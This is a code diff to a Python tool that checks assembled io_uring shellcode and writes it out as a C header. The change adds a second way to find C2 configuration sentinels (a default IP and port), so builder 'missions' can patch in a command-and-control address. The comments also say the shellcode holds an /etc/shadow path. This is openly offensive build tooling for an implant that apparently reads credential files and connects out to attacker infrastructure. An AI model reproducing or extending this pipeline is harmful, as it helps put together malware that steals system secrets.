@@ -37,11 +37,15 @@ def find_pattern(data: bytes, pattern: bytes) -> list[int]:
 
 def locate_config(data: bytes) -> dict:
     """
-    Locate _config_sa — the 16-byte struct sockaddr_in at the data tail —
-    by searching for the default sentinel byte run near the end of the
-    binary: family (0x02,0x00) + default port (0x11,0x5c BE) + default IP
-    ([127,0,0,1] network byte order). sin_port = sa+2, sin_addr = sa+4
-    (sqpoll_min.asm data-tail contract).
+    Locate the C2 config by searching for default sentinel byte runs near
+    the end of the binary. Two layouts exist:
+
+    1. sockaddr_in blob (sqpoll_min.asm, 16-byte _config_sa): family
+       (0x02,0x00) + default port (0x11,0x5c BE) + default IP
+       ([127,0,0,1]) — sin_port = sa+2, sin_addr = sa+4.
+    2. separate ip-then-port labels (combined/shellcode.asm and every
+       builder mission: _config_ip immediately followed by _config_port):
+       [127,0,0,1] + [0x11,0x5c] — ip = base, port = base+4.
     """
     offsets = {}
     search_from = len(data) * 3 // 4  # search in last 25% of binary
@@ -52,6 +56,15 @@ def locate_config(data: bytes) -> dict:
         offsets['CONFIG_PORT_OFFSET'] = base + 2
         offsets['CONFIG_IP_OFFSET'] = base + 4
         break  # take first occurrence
+
+    # Layout 2: builder/combined emit _config_ip + _config_port adjacent
+    if 'CONFIG_IP_OFFSET' not in offsets:
+        ippattern = bytes([127, 0, 0, 1, 0x11, 0x5C])
+        for off in find_pattern(data[search_from:], ippattern):
+            base = search_from + off
+            offsets['CONFIG_IP_OFFSET'] = base
+            offsets['CONFIG_PORT_OFFSET'] = base + 4
+            break  # take first occurrence
 
     # Path sentinel: /etc/shadow (read-only, not patchable, just informational)
     path_pattern = b'/etc/shadow\x00'
@@ -97,13 +110,16 @@ def emit_c_array(data: bytes) -> None:
 def main():
     parser = argparse.ArgumentParser(description='Validate io_uring shellcode binary')
     parser.add_argument('binary', help='Assembled shellcode binary')
-    parser.add_argument('--header', default='shellcode.h',
-                        help='Output C header file (default: shellcode.h)')
+    parser.add_argument('--header', default=None,
+                        help='Output C header file (default: <binary>.h '
+                             'next to the binary)')
     parser.add_argument('--no-array', action='store_true',
                         help='Skip printing C array')
     args = parser.parse_args()
 
     data = Path(args.binary).read_bytes()
+    header_out = Path(args.header) if args.header \
+        else Path(args.binary).with_suffix('.h')
 
     print(f"[*] Binary:     {args.binary}")
     print(f"[*] Size:       {len(data)} bytes")
@@ -126,7 +142,7 @@ def main():
         print(f"[!] Could not locate config sentinels — check default IP/port values")
 
     emit_header(data, {k: v for k, v in offsets.items()
-                        if 'CONFIG' in k}, Path(args.header))
+                        if 'CONFIG' in k}, header_out)
 
     if not args.no_array:
         emit_c_array(data)
